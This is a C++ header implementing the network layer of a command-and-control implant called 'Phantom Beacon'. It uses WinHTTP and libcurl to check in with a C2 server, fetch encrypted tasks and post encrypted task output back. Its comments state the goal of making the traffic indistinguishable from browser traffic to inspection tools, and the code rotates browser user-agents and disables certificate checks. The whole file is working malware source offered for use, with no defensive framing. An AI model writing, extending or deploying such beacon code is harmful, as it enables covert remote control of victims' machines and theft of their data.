#pragma once
// ============================================================================
//  network.h — Phantom Beacon Network Layer
//  ──────────────────────────────────────────
//  HTTPS communication with the C2 server using WinHTTP.
//  Traffic appears as standard HTTPS — indistinguishable from browser traffic
//  to network inspection tools.
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <winhttp.h>
    #pragma comment(lib, "winhttp.lib")
#else
    #include <curl/curl.h>
    #include <string.h>
    #include <algorithm>
#endif
#include <string>
#include <cstdlib>
#include <ctime>

#include "crypto.h"

namespace net {

// ── Configuration ──────────────────────────────────────────────────────────
// These will be patched at compile time or set via config.
struct C2Config {
    std::wstring host      = L"127.0.0.1";
    int          port      = 443;
    bool         use_https = false;    // Set to true for production
    int          sleep_ms  = 5000;     // Base sleep interval (ms)
    int          jitter    = 30;       // Jitter percentage (0-100)
    std::string  beacon_id;            // Unique agent identifier

    // Calculate actual sleep with jitter
    int get_sleep_ms() const {
        if (jitter <= 0) return sleep_ms;
        int variation = (sleep_ms * jitter) / 100;
        // Simple random without pulling in <random> (lighter binary)
        int offset = (rand() % (2 * variation + 1)) - variation;
        return std::max(1000, sleep_ms + offset);  // Minimum 1 second
    }
};

// ── User-Agent Rotation ────────────────────────────────────────────────────
// Rotate through common browser user-agents to blend in with normal traffic.

#ifdef _WIN32
static const wchar_t* USER_AGENTS[] = {
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
};
constexpr int NUM_USER_AGENTS = sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]);

inline const wchar_t* get_random_ua() {
    return USER_AGENTS[rand() % NUM_USER_AGENTS];
}

inline std::string http_request(
    const C2Config& cfg,
    const std::wstring& method,
    const std::wstring& path,
    const std::string& body = "",
    const std::string& beacon_id = ""
) {
    std::string response_body;

    HINTERNET hSession = WinHttpOpen(
        get_random_ua(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        cfg.host.c_str(),
        static_cast<INTERNET_PORT>(cfg.port), 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }

    DWORD flags = cfg.use_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        method.c_str(),
        path.c_str(),
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    if (cfg.use_https) {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    }

    std::wstring headers = L"Content-Type: text/plain\r\n";
    if (!beacon_id.empty()) {
        std::wstring wid(beacon_id.begin(), beacon_id.end());
        headers += L"X-Beacon-Id: " + wid + L"\r\n";
    }

    BOOL bResult = WinHttpSendRequest(
        hRequest,
        headers.c_str(),
        static_cast<DWORD>(headers.length()),
        body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.c_str(),
        static_cast<DWORD>(body.size()),
        static_cast<DWORD>(body.size()),
        0);
    if (!bResult) goto cleanup;

    bResult = WinHttpReceiveResponse(hRequest, nullptr);
    if (!bResult) goto cleanup;

    {
        DWORD dwSize = 0;
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;

            std::vector<char> buffer(dwSize + 1, 0);
            DWORD dwDownloaded = 0;
            if (WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) {
                response_body.append(buffer.data(), dwDownloaded);
            }
        } while (dwSize > 0);
    }

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return response_body;
}
#else
static const char* USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
};
constexpr int NUM_USER_AGENTS = sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]);

inline const char* get_random_ua() {
    return USER_AGENTS[rand() % NUM_USER_AGENTS];
}

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

inline std::string http_request(
    const C2Config& cfg,
    const std::wstring& method,
    const std::wstring& path,
    const std::string& body = "",
    const std::string& beacon_id = ""
) {
    std::string response_body;
    CURL *curl = curl_easy_init();
    if (!curl) return "";

    std::string proto = cfg.use_https ? "https://" : "http://";
    std::string host_narrow(cfg.host.begin(), cfg.host.end());
    std::string path_narrow(path.begin(), path.end());
    std::string url = proto + host_narrow + ":" + std::to_string(cfg.port) + path_narrow;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_USERAGENT, get_random_ua());
    
    std::string method_narrow(method.begin(), method.end());
    if (method_narrow == "POST") {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        if (!body.empty()) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, body.size());
        }
    } else {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method_narrow.c_str());
    }

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: text/plain");
    if (!beacon_id.empty()) {
        std::string h = "X-Beacon-Id: " + beacon_id;
        headers = curl_slist_append(headers, h.c_str());
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);

    if (cfg.use_https) {
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    }

    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return response_body;
}
#endif

// ── High-Level C2 Functions ────────────────────────────────────────────────

// Check in with the C2 server and retrieve pending tasks.
// Returns the decrypted JSON string with tasks, or "" on failure.
inline std::string checkin(const C2Config& cfg, const std::string& payload = "") {
    std::wstring method = payload.empty() ? L"GET" : L"POST";
    std::string body = payload.empty() ? "" : crypto::encrypt(payload);
    std::string encrypted_response = http_request(
        cfg, method, L"/api/v1/ping", body, cfg.beacon_id);

    if (encrypted_response.empty()) return "";
    return crypto::decrypt(encrypted_response);
}

// Send an encrypted result back to the C2 server.
inline bool send_result(const C2Config& cfg, const std::string& task_id, const std::string& output) {
    // Build JSON payload
    std::string json = "{\"task_id\":\"" + task_id + "\",\"output\":\"";
    // Escape the output for JSON
    for (char c : output) {
        switch (c) {
            case '"':  json += "\\\""; break;
            case '\\': json += "\\\\"; break;
            case '\n': json += "\\n";  break;
            case '\r': json += "\\r";  break;
            case '\t': json += "\\t";  break;
            default:   json += c;      break;
        }
    }
    json += "\"}";

    std::string encrypted = crypto::encrypt(json);
    if (encrypted.empty()) return false;

    std::string resp = http_request(cfg, L"POST", L"/api/v1/result", encrypted, cfg.beacon_id);
    return !resp.empty();
}

}  // namespace net
